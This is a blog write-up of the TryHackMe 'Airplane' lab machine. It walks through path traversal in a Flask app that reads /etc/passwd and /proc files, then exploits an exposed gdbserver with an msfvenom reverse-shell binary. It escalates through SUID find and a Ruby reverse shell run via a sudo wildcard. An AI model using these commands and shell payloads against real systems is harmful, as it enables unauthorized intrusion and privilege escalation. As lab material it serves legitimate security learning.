---
layout: post
title: Airplane writeup (TryHackMe)
author: wizarddos
category: writeups
excerpt_separator: <!--more-->
---

Welcome everyone! 
New machine landed on tryhackme, so of course I had to give it a try

It's called [`Airplane`](https://tryhackme.com/r/room/airplane) - I don't know what to expect but let's go

### Recon

The first thing is always a port scan
```
$ rustscan -a $IP -- -sC -sV    
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.73.183:22
Open 10.10.73.183:6048
Open 10.10.73.183:8000
```

3 ports open - gotta enumerate further
```
PORT     STATE SERVICE  REASON  VERSION
22/tcp   open  ssh      syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
6048/tcp open  x11?    syn-ack
8000/tcp open  http-alt syn-ack Werkzeug/3.0.2 Python/3.8.10
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/3.0.2 Python/3.8.10
|     Date: Fri, 07 Jun 2024 18:56:19 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/3.0.2 Python/3.8.10
|     Date: Fri, 07 Jun 2024 18:56:14 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 269
|     Location: http://airplane.thm:8000/?page=index.html
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://airplane.thm:8000/?page=index.html">http://airplane.thm:8000/?page=index.html</a>. If not, click the link.
|   Socks5: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('
|     ').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Werkzeug/3.0.2 Python/3.8.10
|_http-title: Did not follow redirect to http://airplane.thm:8000/?page=index.html
```

But now add `airplane.thm` to `/etc/hosts`
```
$ echo "$IP    airplane.thm"|  sudo tee -a  /etc/hosts
```

Time for the website!

### Website enumeration

As we know the domain, I've also added it to my terminal
```
$ export HOST="airplane.thm" 
```

Now let's look around
```
$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u "http://$HOST:8000/" -x html,js,txt,py -t 20
```

While it's running - we can look at the page

it takes one parameter - `page`
```
http://airplane.thm:8000/?page=index.html
```

What if we tried `../../../../../../etc/passwd`

Something got downloaded!

![I think it's it](https://i.ibb.co/XXvyYmB/obraz.png)

### Web exploitation

What's in there?
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
[Bunch of other stuff]
carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
hudson:x:1001:1001::/home/hudson:/bin/bash
sshd:x:128:65534::/run/sshd:/usr/sbin/nologin
```

We now know that we've got 2 users - `hudson` and `carlos`

I've downloaded enviromental variables too
```
http://airplane.thm:8000/?page=../../../../../../proc/self/environ
```
```
LANG=en_US.UTF-8�LC_ADDRESS=tr_TR.UTF-8
LC_IDENTIFICATION=tr_TR.UTF-8
LC_MEASUREMENT=tr_TR.UTF-8
LC_MONETARY=tr_TR.UTF-8
LC_NAME=tr_TR.UTF-8
LC_NUMERIC=tr_TR.UTF-8
LC_PAPER=tr_TR.UTF-8
LC_TELEPHONE=tr_TR.UTF-8
LC_TIME=tr_TR.UTF-8
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
HOME=/home/hudson
LOGNAME=hudson
USER=hudson
SHELL=/bin/bash
INVOCATION_ID=a7b6db43cf784a56a137cd6d6a5ed120
JOURNAL_STREAM=9:20267
```

It doesn't run as `www-data` but as `hudson` - a user

From my enumeration it turns out, that 2 directories above we've got `/home/hudson`

Using this path -`../app.py` - I've got the source code
```py
from flask import Flask, send_file, redirect, render_template, request
import os.path

app = Flask(__name__)


@app.route('/')
def index():
    if 'page' in request.args:
        page = 'static/' + request.args.get('page')

        if os.path.isfile(page):
            resp = send_file(page)
            resp.direct_passthrough = False

            if os.path.getsize(page) == 0:
                resp.headers["Content-Length"]=str(len(resp.get_data()))

            return resp
        
        else:
            return "Page not found"

    else:
        return redirect('http://airplane.thm:8000/?page=index.html', code=302)

@app.route('/airplane')
def airplane():
    return render_template('airplane.html')


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```

Nothing more interesting, than we already know
With this in mind - let's try to enumerate service on port `6048`

### `6048` enumeration

First I checked for false positive by searching `/proc/dev/tcp`

With this python script
```py
# -*- coding: utf-8 -*-
import re
import sys
import argparse

parser = argparse.ArgumentParser(
                    prog='/proc/net/tcp decoder',
                    description='Upgraded code from Reboare to transform /proc/net/tcp into human readable format')

parser.add_argument('filename') 
args = parser.parse_args()

def process_file(procnet):
    sockets = procnet.split('\n')[1:-1]
    return [line.strip() for line in sockets]

def split_every_n(data, n):
    return [data[i:i+n] for i in range(0, len(data), n)]

def convert_linux_netaddr(address):

    hex_addr, hex_port = address.split(':')

    addr_list = split_every_n(hex_addr, 2)
    addr_list.reverse()

    addr = ".".join(map(lambda x: str(int(x, 16)), addr_list))
    port = str(int(hex_port, 16))

    return "{}:{}".format(addr, port)

def format_line(data):
    return (("%(seq)-4s %(uid)5s %(local)25s %(remote)25s %(timeout)8s %(inode)8s" % data) + "\n")

with open(args.filename) as f:
    sockets = process_file(f.read())

columns = ("seq", "uid", "inode", "local", "remote", "timeout")
title = dict()
for c in columns:
    title[c] = c

rv = []
for info in sockets:
    _ = re.split(r'\s+', info)

    _tmp = {
        'seq': _[0],
        'local': convert_linux_netaddr(_[1]),
        'remote': convert_linux_netaddr(_[2]),
        'uid': _[7],
        'timeout': _[8],
        'inode': _[9],
    }
    rv.append(_tmp)

if len(rv) > 0:
    sys.stderr.write(format_line(title))

    for _ in rv:
        sys.stdout.write(format_line(_))
```

Which is a modified version of [this gist](https://gist.github.com/Reboare/2e0122b993b8557935fd37b27436f8c2) I turned `/proc/net/tcp` into more readable form
```
$ python3 tcp-parser.py tcp
seq    uid                     local                    remote  timeout    inode
0:     101             127.0.0.53:53                 0.0.0.0:0        0    14850
1:       0                0.0.0.0:22                 0.0.0.0:0        0    20719
2:       0             127.0.0.1:631                 0.0.0.0:0        0    18221
3:    1001              0.0.0.0:8000                 0.0.0.0:0        0    21672
4:    1001              0.0.0.0:6048                 0.0.0.0:0        0    21568
5:    1001         10.10.92.113:8000          10.9.3.230:59002        0    37011
```

Yup, it's actually running and it runs as `hudson` as well (From `/etc/passwd` we know that `hudson` has UID `1001`)

Now it's time to brute-force PID and command running the process
```
$ for i in {1..1000}; do echo -n "\r$i"; out=$(curl -s "http://airplane.thm:8000/?page=../../../../../proc/$i/cmdline" | sed 's/\x00/ /g' | grep -v 'Page not found'); if [ -n "$out" ]; then echo "\r$i : $out"; fi; done
[...]
521 : /usr/sbin/NetworkManager --no-daemon 
522 : /usr/sbin/NetworkManager --no-daemon 
525 : /usr/bin/gdbserver 0.0.0.0:6048 airplane 
529 : /usr/bin/python3 app.py 
532 : /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal 
533 : /usr/sbin/ModemManager
```

It runs `gdbserver`. Let's check [bookhacktricks.xyz](https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver#upload-and-execute)
There, I found a nice way to upload a shell

### `gdbserver` exploitation

First I created msfvenom shell
```
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 PrependFork=true -f elf -o binary.elf
$ chmod +x binary.elf
```
Then I run GDB
```
$ gdb binary.elf
```

Inside `gdb` shell we set remote target
```
target extended-remote 10.10.92.113:6048
```

Then upload malicious binary to `/tmp`
```
remote put binary.elf /tmp/binary.elf
```
Set executable
```
set remote exec-file /tmp/binary.elf
```

And netcat listener on your machine
```
$ nc -lvnp 4444
```

Then, run!
```
run
```

We've got it! Time to stabilize the shell
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
$
```

### Privilege escalation 1 - getting `carlos` user
After running this command
```
$ find / -type f -perm -04000 -ls 2>/dev/null
```

We see that we can run `/usr/bin/find` as `carlos`

Quick trip to [GTFOBins](https://gtfobins.github.io/gtfobins/find/#suid) gives us
```
$ /usr/bin/find . -exec /bin/sh -p \; -quit
$ whoami
carlos
```

And we're `carlos` -  get user flag
```
$ cat /home/carlos/user.txt
```

I couldn't really stabilize it with python, so I just uploaded my public ssh key and loged in via SSH

Let's go for root now!

### Privilege escalation 2 - gettting `root` 

What will `sudo -l` give us?
```
$ sudo -l
Matching Defaults entries for carlos on airplane:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User carlos may run the following commands on airplane:
    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
```

We can run anything placed inside `/root` folder which has `.rb` extentions with `ruby`

So, how about we utilize Path Traversal once again and get the shell that way

First in `/tmp` create a file called `shell.rb`

```rb
#!/usr/bin/env ruby
# syscall 33 = dup2 on 64-bit Linux
# syscall 63 = dup2 on 32-bit Linux
# test with nc -lvp 1337 

require 'socket'

s = Socket.new 2,1
s.connect Socket.sockaddr_in 1337, '[YOUR IP]'

[0,1,2].each { |fd| syscall 33, s.fileno, fd }
exec '/bin/sh -i'
```
[Reverse shell comes from here](https://gist.github.com/gr33n7007h/c8cba38c5a4a59905f62233b36882325)

Of course replace `[Your IP]` with actual THM IP

Then, set up a netcat listener on your machine
```
$ nc -lvnp 1337
```

And execute the shell with using payload that contains `../` in it
```
$ sudo /usr/bin/ruby /root/../tmp/shell.rb
```

Netcat we got the shell, we are root!
```
$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.9.3.230] from (UNKNOWN) [10.10.242.145] 54412
# whoami
root
```

And that's it - machine pwned go for the root flag

## Conclusion

Oh god, I had to use a writeup to get through initial access part.

While privilege escalation was kind of trivial, obtaining user shell was really challenging

It was the first time, I've looked into `/proc` dir and enumerated something there - my notes are growing!

I hope you've enjoyed it as much as I did, thanks for reading.

Check out [my other blog](https://wizarddos.github.io/blog) as I'm planning to post one pretty big article there

And that's about it, wait for video version of this writeup and see you next time!
